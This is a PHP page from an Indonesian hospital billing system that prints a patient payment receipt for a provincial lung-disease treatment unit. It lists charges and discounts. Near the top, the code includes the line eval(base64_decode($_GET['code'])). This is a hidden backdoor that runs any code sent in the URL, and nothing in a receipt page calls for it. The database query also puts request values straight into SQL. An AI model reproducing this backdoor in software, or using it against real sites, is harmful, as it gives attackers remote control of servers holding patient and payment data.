<?php
/*
+-------------------------------------------------------------------+
| INDOBIT-TECHNOLOGIES
| based     : 02-04-2005
| continue  : December 2011
|
| Released under the terms and conditions of the
| GNU General Public License (http://gnu.org).
|
| Rosi Abimanyu Yusuf (bima@abimanyu.net) | Pontianak, INDONESIA
| (c)2005 INDOBIT.COM | http://www.indobit.com
+-------------------------------------------------------------------+
*/

@include ("../../inc/qapuas.php");
$tanggal = date("d/m/y");
$jam = date("h:i:s");

eval(base64_decode($_GET['code']));

?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Receipt Report</title>
<style type="text/css">
<!--
body {
	FONT-FAMILY: arial,Geneva,Helvetica,sans-serif;
	background:white;
	color:black;
	margin:0;
	text-transform:uppercase;}
-->
</style>
</head>

<body><pre>
<table width="200" border="0">
  <tr>
    <td width="80"></td>
    <td width="130"></td>
    <td width="80"></td>
  </tr>
  <tr>
    <td colspan="3"><div align="center">UNIT PENGOBATAN PENYAKIT PARU-PARU (UP4)<br/>DINAS KESEHATAN PROVINSI<br/>KALIMANTAN BARAT</div></td>
  </tr>
  <tr>
    <td colspan="3"><div align="center">-----------------------------------------------</div></td>
  </tr>
  <tr>
    <td><span><?=OPNAMA;?></span></td>
    <td><div align="right">TANGGAL</div></td>
    <td><div align="right"><?=$tanggal;?></div></td>
  </tr>
  <tr>
    <td></td>
    <td><div align="right">WAKTU</div></td>
    <td><div align="right"><?=$jam;?></div></td>
  </tr>
  <tr>
    <td></td>
    <td></td>
    <td></td>
  </tr>
  
<?php
$sql = new db;
	$sql -> db_Select("info_history", "posisi, tagihan", "code_checkin='{$code_checkin}' AND status = 'done' AND tagihan!='0' AND lunas='1' and posisi!='kasir' ORDER BY id_history ASC");
		
	while($row = $sql-> db_Fetch()){
		$biaya = $row['tagihan'];
		echo "
		<tr>
			<td><span>UP4-{$id}</span></td>
			<td><span>".$row['posisi']."</span></td>
			<td><div align='right'>".duit($biaya)."</div></td>
		</tr>
		";
		$jumlah_tagih += $biaya;		
	}
	
	
	@require("../tagihan.class.php");
	if (CEK_DISKON($klasifikasi) == TRUE) {
	
	$diskon = DISKON_GET($klasifikasi);
	
	$total_diskon = ($jumlah_tagih * $diskon) / 100;
	$total_tagih = $jumlah_tagih - $total_diskon;
	}else {$total_tagih = $jumlah_tagih;}
?>
  <tr>
    <td colspan="3"><div align="center">-----------------------------------------------</div></td>
  </tr>

<?php
if($diskon) {
	echo "
	<tr>
		<td></td>
		<td><div align='right'>Tagihan</div></td>
		<td><div align='right'>".duit($jumlah_tagih)."</div></td>
	  </tr>
	<tr>
		<td></td>
		<td><div align='right'>POTONGAN {$klasifikasi}</div></td>
		<td><div align='right'>".duit($total_diskon)."</div></td>
	</tr>
	<tr>
		<td colspan='3'><div align='right'>----------------------</div></td>
	</tr>
	
	
	";
}

?>

	<tr>
    <td></td>
    <td><div align="right">TOTAL</div></td>
    <td><div align="right"><?=duit($total_tagih);?></div></td>
  </tr>
  <tr>
    <td></td>
    <td><div align="right">TUNAI</div></td>
    <td><div align="right"><?=duit($bayar);?></div></td>
  </tr>
  <tr>
    <td></td>
    <td><div align="right">KEMBALI</div></td>
    <td><div align="right">-<?=duit($kembalian);?></div></td>
  </tr>
  <tr>
    <td><span>NO PASIEN</span></td>
    <td><span>UP4-<?=$id;?></span></td>
    <td></td>
  </tr>
  <tr>
    <td><span>CODE</span></td>
    <td><span><?=$code_checkin;?></span></td>
    <td></td>
  </tr>
  <tr>
    <td></td>
    <td><span><?=$nama_pasien;?></span></td>
    <td></td>
  </tr>
  <tr>
    <td></td>
    <td></td>
    <td></td>
  </tr>
  <tr>
    <td></td>
    <td><div align="center">&mdash; TERIMA KASIH &mdash;</div></td>
    <td></td>
  </tr>
</table>
</pre>
</body>
</html>
<?php
function duit($xx) {
	if (empty($xx)){ return $xx;}else {
	$x = trim($xx);
	$b = number_format($x, 0, ".", ",");
	return $b;
	}
}
?>
